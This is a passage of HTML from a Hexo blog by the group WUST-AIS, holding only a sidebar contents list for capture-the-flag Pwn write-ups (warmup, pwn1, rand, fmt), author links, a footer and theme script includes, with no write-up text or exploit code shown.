href="#Pwn"><span class="nav-number">5.</span> <span class="nav-text">Pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#warmup"><span class="nav-number">5.1.</span> <span class="nav-text">warmup</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#程序分析"><span class="nav-number">5.1.1.</span> <span class="nav-text">程序分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#计算偏移量"><span class="nav-number">5.1.2.</span> <span class="nav-text">计算偏移量</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Exploit-1"><span class="nav-number">5.1.3.</span> <span class="nav-text">Exploit</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwn1"><span class="nav-number">5.2.</span> <span class="nav-text">pwn1</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#程序分析-1"><span class="nav-number">5.2.1.</span> <span class="nav-text">程序分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#leak"><span class="nav-number">5.2.2.</span> <span class="nav-text">leak</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ret"><span class="nav-number">5.2.3.</span> <span class="nav-text">ret</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Exploit-2"><span class="nav-number">5.2.4.</span> <span class="nav-text">Exploit</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#rand"><span class="nav-number">5.3.</span> <span class="nav-text">rand</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#程序分析-2"><span class="nav-number">5.3.1.</span> <span class="nav-text">程序分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Exploit-3"><span class="nav-number">5.3.2.</span> <span class="nav-text">Exploit</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fmt"><span class="nav-number">5.4.</span> <span class="nav-text">fmt</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="WUST-AIS"
+      src="/uploads/logo.png">
+  <p class="site-author-name" itemprop="name">WUST-AIS</p>
+  <div class="site-description" itemprop="description">Join us</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">9</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/wust-ais" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;wust-ais" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:no-reply-wais@foxmail.com" title="E-Mail → mailto:no-reply-wais@foxmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">WUST-AIS</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> v4.2.1
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Theme – <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.7.2
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
